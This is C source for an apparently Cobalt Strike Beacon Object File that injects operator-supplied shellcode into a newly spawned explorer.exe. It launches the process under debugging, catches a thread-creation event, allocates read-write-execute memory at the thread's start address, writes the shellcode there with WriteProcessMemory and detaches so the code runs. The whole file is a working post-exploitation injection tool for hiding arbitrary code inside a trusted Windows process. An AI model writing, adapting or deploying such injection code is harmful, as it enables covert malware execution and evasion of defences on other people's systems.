#include <windows.h>
#include "Structs.h"
#include "beacon.h"

//----------------------------------------------------------------------------------------------------------------------------------------------------------
#define MemCopy                             __movsb
#define MemSet                              __stosb
#define PRNT_WN_ERR(szWnApiName)            BeaconPrintf(CALLBACK_OUTPUT, "[!] %s Failed With Error: %d \n", szWnApiName, KERNEL32$GetLastError());
#define PRNT_NT_ERR(szNtApiName, NtErr)     BeaconPrintf(CALLBACK_OUTPUT, "[!] %s Failed With Error: 0x%0.8X \n", szNtApiName, NtErr);  
#define TARGET_PROCESS_PATH	  L"C:\\Windows\\explorer.exe"

#define DELETE_HANDLE(H)                                \
    if (H != NULL && H != INVALID_HANDLE_VALUE){        \
        KERNEL32$CloseHandle(H);                        \
        H = NULL;                                       \
    }  

DECLSPEC_IMPORT DWORD KERNEL32$GetLastError();

DECLSPEC_IMPORT BOOL KERNEL32$VirtualProtect(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
);

DECLSPEC_IMPORT BOOL KERNEL32$CreateProcessW (LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

DECLSPEC_IMPORT HANDLE KERNEL32$CreateFileW(
  LPCWSTR               lpFileName,
  DWORD                 dwDesiredAccess,
  DWORD                 dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD                 dwCreationDisposition,
  DWORD                 dwFlagsAndAttributes,
  HANDLE                hTemplateFile
);

DECLSPEC_IMPORT BOOL KERNEL32$CloseHandle(
  HANDLE hObject
);
DECLSPEC_IMPORT BOOL KERNEL32$DebugActiveProcessStop(DWORD dwProcessId);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

DECLSPEC_IMPORT DWORD KERNEL32$GetThreadId(HANDLE Thread);




DECLSPEC_IMPORT  BOOL  KERNEL32$WriteProcessMemory (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
DECLSPEC_IMPORT  BOOL  KERNEL32$WaitForDebugEvent(LPDEBUG_EVENT lpDebugEvent, DWORD dwMilliseconds);
DECLSPEC_IMPORT  BOOL  KERNEL32$ContinueDebugEvent(DWORD dwProcessId, DWORD dwThreadId, DWORD dwContinueStatus);
DECLSPEC_IMPORT  BOOL  KERNEL32$DebugActiveProcessStop(DWORD dwProcessId);
DECLSPEC_IMPORT void KERNEL32$Sleep(DWORD dwMilliseconds);
DECLSPEC_IMPORT void KERNEL32$GetSystemInfo(LPSYSTEM_INFO lpSystemInfo);

DECLSPEC_IMPORT _Post_equals_last_error_ DWORD GetLastError();

BOOL ShellcodeModuleStomp(IN LPCWSTR szSacrificialProcess, IN PBYTE pBuffer, IN SIZE_T sBufferSize) {

  STARTUPINFOW			StartupInfo					= { .cb = sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION		ProcessInfo					= { 0 };
	WCHAR					szTargetProcess[MAX_PATH]	= TARGET_PROCESS_PATH;
	DEBUG_EVENT				DebugEvent					= { 0 };
	SIZE_T					sNumberOfBytesWritten		= 0x00;

    if (!KERNEL32$CreateProcessW(szTargetProcess, NULL, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &StartupInfo, &ProcessInfo)) {
     BeaconPrintf(CALLBACK_OUTPUT,"[!] CreateProcessW Failed With Error: %d \n", KERNEL32$GetLastError());

		return -1;
	}
  BeaconPrintf(CALLBACK_OUTPUT, "[+] Success - Spawned process at %d (PID)",ProcessInfo.dwProcessId);
BeaconPrintf(CALLBACK_OUTPUT,"[!] CreateProcessW success %d",KERNEL32$GetLastError() );



	// Parsing all debug events
	while (KERNEL32$WaitForDebugEvent(&DebugEvent, INFINITE)) {


		switch (DebugEvent.dwDebugEventCode) {

		
			// New thread creation  
			case CREATE_THREAD_DEBUG_EVENT: {
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Targetting Thread: %d\n", KERNEL32$GetThreadId(DebugEvent.u.CreateThread.hThread));
				BeaconPrintf(CALLBACK_OUTPUT,"[i] Writing Shellcode At Thread's Start Address: 0x%p \n", DebugEvent.u.CreateProcessInfo.lpStartAddress);
BeaconPrintf(CALLBACK_OUTPUT,"[!] WaitForDebugEvent %d",KERNEL32$GetLastError() );


BeaconPrintf(CALLBACK_OUTPUT,"[!] Size of Buffer to be written %d",sBufferSize);

if (!KERNEL32$VirtualAllocEx(ProcessInfo.hProcess, DebugEvent.u.CreateProcessInfo.lpStartAddress, sBufferSize, MEM_COMMIT | MEM_RESERVE | MEM_LARGE_PAGES, PAGE_EXECUTE_READWRITE )){
	SYSTEM_INFO sysinfo;
	KERNEL32$GetSystemInfo(&sysinfo);

	BeaconPrintf(CALLBACK_OUTPUT,"[!] VirtualAllocEx failed with error  %d",KERNEL32$GetLastError());
	BeaconPrintf(CALLBACK_OUTPUT,"[!] VirtualAllocEx Page Size  %d",sysinfo.dwPageSize);
}
BeaconPrintf(CALLBACK_OUTPUT,"[!] VirtualAllocex success");

				if (!KERNEL32$WriteProcessMemory(ProcessInfo.hProcess, DebugEvent.u.CreateProcessInfo.lpStartAddress, pBuffer, sBufferSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sBufferSize) {
BeaconPrintf(CALLBACK_OUTPUT,"[!] WriteProcessMemory failed with error  %d",KERNEL32$GetLastError() );
					return -1;
				}
				if (!KERNEL32$DebugActiveProcessStop(ProcessInfo.dwProcessId)) {
		BeaconPrintf(CALLBACK_OUTPUT,"[!] DebugActiveProcessStop failed with error  %d",KERNEL32$GetLastError() );

					return -1;
				}

BeaconPrintf(CALLBACK_OUTPUT,"[!] DebugActiveProcessStop Success with ProcessID %d and thread  %d and Error %d",DebugEvent.dwProcessId, DebugEvent.dwThreadId,KERNEL32$GetLastError());
				// Resume thread creation
				KERNEL32$ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
BeaconPrintf(CALLBACK_OUTPUT,"[!] ContinueDebugEvent Get last Error before closing %d",KERNEL32$GetLastError() );


				// Detach child process
				goto _END_OF_FUNC;
			};

			case EXIT_PROCESS_DEBUG_EVENT:
	
BeaconPrintf(CALLBACK_OUTPUT,"[!] EXIT_PROCESS_DEBUG_EVENT %d",KERNEL32$GetLastError() );

				return 0;

			default:
				break;
		}

BeaconPrintf(CALLBACK_OUTPUT,"[!] ContinueDebugEvent success %d",KERNEL32$GetLastError() );
		KERNEL32$ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, ((DWORD)0x00010002L));
BeaconPrintf(CALLBACK_OUTPUT,"[!] ContinueDebugEven Get last Error  %d",KERNEL32$GetLastError() );


	}

_END_OF_FUNC:
	KERNEL32$CloseHandle(ProcessInfo.hProcess);
	KERNEL32$CloseHandle(ProcessInfo.hThread);
BeaconPrintf(CALLBACK_OUTPUT,"[!] Exiting %d",KERNEL32$GetLastError() );
	
return TRUE;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------------


void go(char* args, int argc) {
    datap Parser    = { 0 };
    PSTR  Shellcode = { 0 };
    DWORD Length    = { 0 };

    /* Prepare our argument buffer */
    BeaconDataParse(&Parser, args, argc);

	/* Parse our shellcode */
    Shellcode = (LPBYTE) BeaconDataExtract(&Parser, (int*)(&Length));

    BeaconPrintf( CALLBACK_OUTPUT, "Shellcode @ %p [%d bytes]", Shellcode, Length );

    /* execute the parsed shellcode in the stomped module */
    
    if (!ShellcodeModuleStomp(TARGET_PROCESS_PATH, Shellcode, Length)) {
        BeaconPrintf(CALLBACK_ERROR, "ShellcodeModuleStomp Failed");
    }
}
